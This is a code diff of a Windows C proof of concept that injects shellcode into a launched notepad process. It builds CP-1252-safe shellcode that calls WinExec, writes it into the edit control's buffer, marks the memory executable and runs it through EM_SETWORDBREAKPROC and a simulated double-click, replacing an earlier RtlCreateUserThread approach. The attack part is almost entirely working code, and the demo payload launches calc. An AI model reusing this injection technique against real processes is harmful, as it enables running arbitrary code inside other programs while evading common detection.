@@ -36,6 +36,9 @@
 #include <limits.h>
 
 #include <windows.h>
+#include <commctrl.h>
+#include <tlhelp32.h>
+
 #pragma comment(lib, "user32.lib")
 
 typedef uint8_t u8;
@@ -75,55 +78,6 @@ typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
 // windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF
 #define MAX_ADDR 6
 
-// This code stub stores the string "calc\0" on the stack
-// and loads the address into RCX. It also sets RDX to SW_SHOW.
-#define CALC_SIZE 104
-
-char CALC[] = {
-  /* 0000 */ "\x6a\x00"             /* push  0               */
-  /* 0002 */ "\xc8\x00\x01\x00"     /* enter 0x100, 0        */
-  /* 0006 */ "\x6a\x00"             /* push  0               */
-  /* 0008 */ "\x54"                 /* push  rsp             */
-  /* 0009 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 000C */ "\x5f"                 /* pop   rdi             */
-  /* 000D */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0010 */ "\x57"                 /* push  rdi             */
-  /* 0011 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0014 */ "\x59"                 /* pop   rcx             */
-  /* 0015 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0018 */ "\xb8\x00\x63\x00\xff" /* mov   eax, 0xff006300 */
-  /* 001D */ "\x00\x27"             /* add   byte [rdi], ah  */
-  /* 001F */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0022 */ "\xae"                 /* scasb                 */
-  /* 0023 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0026 */ "\xb8\x00\x61\x00\xff" /* mov   eax, 0xff006100 */
-  /* 002B */ "\x00\x27"             /* add   byte [rdi], ah  */
-  /* 002D */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0030 */ "\xae"                 /* scasb                 */
-  /* 0031 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0034 */ "\xb8\x00\x6c\x00\xff" /* mov   eax, 0xff006c00 */
-  /* 0039 */ "\x00\x27"             /* add   byte [rdi], ah  */
-  /* 003B */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 003E */ "\xae"                 /* scasb                 */
-  /* 003F */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0042 */ "\xb8\x00\x63\x00\xff" /* mov   eax, 0xff006300 */
-  /* 0047 */ "\x00\x27"             /* add   byte [rdi], ah  */
-  /* 0049 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 004C */ "\xae"                 /* scasb                 */
-  /* 004D */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0050 */ "\xaa"                 /* stosb                 */
-  /* 0051 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0054 */ "\x6a\x00"             /* push  0               */
-  /* 0056 */ "\x54"                 /* push  rsp             */
-  /* 0057 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 005A */ "\x58"                 /* pop   rax             */
-  /* 005B */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 005E */ "\xc6\x00\x05"         /* mov   byte [rax], 5   */
-  /* 0061 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0064 */ "\x5a"                 /* pop   rdx             */
-  /* 0065 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-};
-
 // Allocate 64-bit buffer on the stack.
 // Then place the address in RDI for writing.
 #define STORE_ADDR_SIZE 10
@@ -131,9 +85,9 @@ char CALC[] = {
 char STORE_ADDR[] = {
   /* 0000 */ "\x6a\x00"             /* push 0                */
   /* 0002 */ "\x54"                 /* push rsp              */
-  /* 0003 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0003 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
   /* 0006 */ "\x5f"                 /* pop  rdi              */
-  /* 0007 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0007 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
 };
 
 // Load an 8-Bit immediate value into AH
@@ -147,8 +101,8 @@ char LOAD_BYTE[] = {
 #define SUB_BYTE_SIZE 8
 
 char SUB_BYTE[] = {
-  /* 0000 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
-  /* 0003 */ "\x2d\x00\x20\x00\x4d" /* sub   eax, 0x4d002000 */
+  /* 0000 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
+  /* 0003 */ "\x2d\x00\x20\x00\x5d" /* sub   eax, 0x4d002000 */
 };
 
 // Store AH in buffer and advance RDI by 1
@@ -156,9 +110,9 @@ char SUB_BYTE[] = {
 
 char STORE_BYTE[] = {
   /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
-  /* 0002 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
+  /* 0002 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
   /* 0005 */ "\xae"                 /* scasb                 */
-  /* 0006 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
+  /* 0006 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
 };
 
 // Transfers control of execution to kernel32!WinExec
@@ -183,8 +137,9 @@ int is_cp1252_allowed(int ch) {
     return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
 }
 
+/**
 static
-u8* cp1252_generate_winexec(int *cslen) {
+u8* cp1252_generate_winexec2(int *cslen) {
     int     i, outlen;
     u8      *cs, *out;
     HMODULE m;
@@ -204,7 +159,7 @@ u8* cp1252_generate_winexec(int *cslen) {
     // ***********************************
     // store ntdll!RtlExitUserThread on stack
     m = GetModuleHandle("ntdll");
-    addr.p = GetProcAddress(m, "RtlExitUserThread");
+    addr.p = GetProcAddress(m, "RtlExitUserProcess");
     
     for(i=0; i<MAX_ADDR; i++) {      
       // load a byte into AH
@@ -260,6 +215,132 @@ u8* cp1252_generate_winexec(int *cslen) {
     
     // convert to ascii
     for(i=0; i<outlen; i+=2) {
+      if(cs[i] == 0) {
+        printf("WARNING! Detected null byte at offset %x\n", i);
+      }
+      cs[i/2] = cs[i];
+    }
+
+    *cslen = outlen / 2;
+    
+    // return pointer to code
+    return cs;
+}*/
+
+
+#define RET_OFS2 0x18 + 2
+
+#include "calc4.h"
+
+#define RET_OFS 0x20 + 2
+
+#include "calc3.h"
+
+LPVOID GetRemoteModuleHandle(DWORD pid, LPCSTR lpModuleName) {
+    HANDLE        ss;
+    MODULEENTRY32 me;
+    LPVOID        ba = NULL;
+    
+    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    
+    if(ss == INVALID_HANDLE_VALUE) return NULL;
+    
+    me.dwSize = sizeof(MODULEENTRY32);
+    
+    if(Module32First(ss, &me)) {
+      do {
+        if(me.th32ProcessID == pid) {
+          if(lstrcmpi(me.szModule, lpModuleName)==0) {
+            ba = me.modBaseAddr;
+            break;
+          }
+        }
+      } while(Module32Next(ss, &me));
+    }
+    CloseHandle(ss);
+    return ba;
+}
+
+static
+u8* cp1252_generate_winexec(int pid, int *cslen) {
+    int     i, ofs, outlen;
+    u8      *cs, *out;
+    HMODULE m;
+    w64_t   addr;
+    
+    // it won't exceed 512 bytes
+    out = (u8*)cs = VirtualAlloc(
+      NULL, 4096, 
+      MEM_COMMIT | MEM_RESERVE, 
+      PAGE_EXECUTE_READWRITE);
+    
+    // initialize parameters for WinExec()
+    memcpy(out, CALC3, CALC3_SIZE);
+    out += CALC3_SIZE;
+
+    // initialize RDI for writing
+    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
+    out += STORE_ADDR_SIZE;
+
+    // ***********************************
+    // store kernel32!WinExec on stack
+    m = GetModuleHandle("kernel32");
+    printf("  [+] Local Base address for kernel32 : %p\n", (PVOID)m);
+    addr.q = ((PBYTE)GetProcAddress(m, "WinExec") - (PBYTE)m);
+    m = GetRemoteModuleHandle(pid, "kernel32.dll");
+    printf("  [+] Remote Base address for kernel32 : %p\n", (PVOID)m);
+    addr.q += (ULONG_PTR)m;
+    
+    printf("WinExec : %p\n", addr.p);
+
+    for(i=0; i<MAX_ADDR; i++) {      
+      // load a byte into AH
+      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
+      out[2] = addr.b[i];
+    
+      // if byte not allowed for CP1252, add 32
+      if(!is_cp1252_allowed(out[2])) {
+        out[2] += 32;
+        // subtract 32 from byte at runtime
+        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
+        out += SUB_BYTE_SIZE;
+      }
+      out += LOAD_BYTE_SIZE;
+      // store AH in [RDI], increment RDI
+      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
+      out += STORE_BYTE_SIZE;
+    }
+    
+    // calculate length of constructed code
+    ofs = (int)(out - (u8*)cs) + 2;
+    
+    // first offset
+    printf("Offset is %x\n", ofs);
+    cs[RET_OFS] = (uint8_t)ofs;
+    
+    memcpy(out, RET, RET_SIZE);
+    out += RET_SIZE;
+    
+    memcpy(out, CALC4, CALC4_SIZE);
+    
+    // second offset
+    ofs = CALC4_SIZE;
+    printf("2nd offset is %x\n", ofs);
+    ((u8*)out)[RET_OFS2] = (uint8_t)ofs;
+    out += CALC4_SIZE;
+    
+    outlen = ((int)(out - (u8*)cs) + 1) & -2;
+
+    //DebugBreak();
+   // ((void(*)())cs)(cs);
+    
+    printf("Returned OK.\nSaving code to file.\n");
+    FILE *fd = fopen("unicode.bin", "wb");
+    fwrite(cs, 1, outlen, fd);
+    fclose(fd);
+    
+    // convert to ascii
+    for(i=0; i<=outlen; i+=2) {
       if(cs[i] == 0) {
         printf("WARNING! Detected null byte at offset %x\n", i);
       }
@@ -329,20 +410,22 @@ BOOL CALLBACK EnumThreadWnd(HWND hwnd, LPARAM lParam) {
     return TRUE;
 }
 
+void calc(void);
+
 int main(void) {
-    int                   cslen;
-    PBYTE                 cs;
-    PVOID                 emh;
-    DWORD                 old;
-    SIZE_T                rd;
-    HWND                  hw=NULL;
-    CLIENT_ID             cid;
-    HANDLE                ht;
-    RtlCreateUserThread_t rtlcreate;
-    w64_t                 embuf, lastbuf;
-    HMODULE               m;
-    STARTUPINFO           si;
-    PROCESS_INFORMATION   pi;
+    int                  cslen;
+    PBYTE                cs;
+    PVOID                emh, ptr;
+    DWORD                old;
+    SIZE_T               rd;
+    HWND                 hw=NULL;
+    CLIENT_ID            cid;
+    HANDLE               ht;
+    w64_t                embuf, lastbuf;
+    HMODULE              m;
+    STARTUPINFO          si;
+    PROCESS_INFORMATION  pi;
+    FILE                 *fd;
     
     printf("\n  [+] Executing notepad.\n");
     memset(&si, 0, sizeof(si));
@@ -368,10 +451,10 @@ int main(void) {
     }
     
     printf("  [+] Generating CP-1252 shellcode.\n");
-    cs = cp1252_generate_winexec(&cslen);
+    cs = cp1252_generate_winexec(pi.dwProcessId, &cslen);
     
     // save to file for inspection
-    FILE *fd = fopen("ascii.bin", "wb");
+    fd = fopen("ascii.bin", "wb");
     fwrite(cs, 1, cslen, fd);
     fclose(fd);
     
@@ -415,23 +498,34 @@ int main(void) {
     VirtualProtectEx(pi.hProcess, embuf.p, 
       4096, PAGE_EXECUTE_READWRITE, &old);
     
-    // resolve address of RtlCreateUserThread
-    m = GetModuleHandle("ntdll");
-    rtlcreate = (RtlCreateUserThread_t)
-      GetProcAddress(m, "RtlCreateUserThread");
+    // set procedure to execute
+    printf("  [+] Setting word break procedure to %p\n", embuf.p);
     
-    printf("  [+] Attempting to create new thread...\n");
     
-    // execute shellcode
-    rtlcreate(pi.hProcess, NULL, FALSE, 0, NULL, 
-      NULL, embuf.p, NULL, &ht, &cid);
+    printf("  [+] Attempting to execute code...\n");
     
-    // wait for thread to finish
-    WaitForSingleObject(ht, INFINITE);
+    // clear the contents of buffer and execute via word wrap
+    //SendMessage(hw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
+   
+    //getchar();
+    SendMessage(hw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf.p);
+
+    // clear the contents of edit control
+    //SendMessage(hw, EM_SETSEL, 0, -1);
+    //SendMessage(hw, WM_CLEAR, 0, 0);
+   // SendMessage(hw, WM_PASTE, 0, 0);
+      
+    //getchar();
     
-    // clear the contents of buffer
-    SendMessage(hw, EM_SETSEL, 0, -1);
-    SendMessage(hw, WM_CLEAR, 0, 0);
+    SendMessage(hw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
+   // Sleep(WAIT_TIME);
+    SendMessage(hw, EM_SETWORDBREAKPROC, 0, 0);
+      ReadProcessMemory(pi.hProcess, emh, 
+        &embuf.p, sizeof(ULONG_PTR), &rd);
+      
+      printf("%p\n", embuf.p);
+      
+    getchar();
     
     // set the memory buffer for the edit control to RW
     VirtualProtectEx(pi.hProcess, embuf.p, 4096, old, &old);
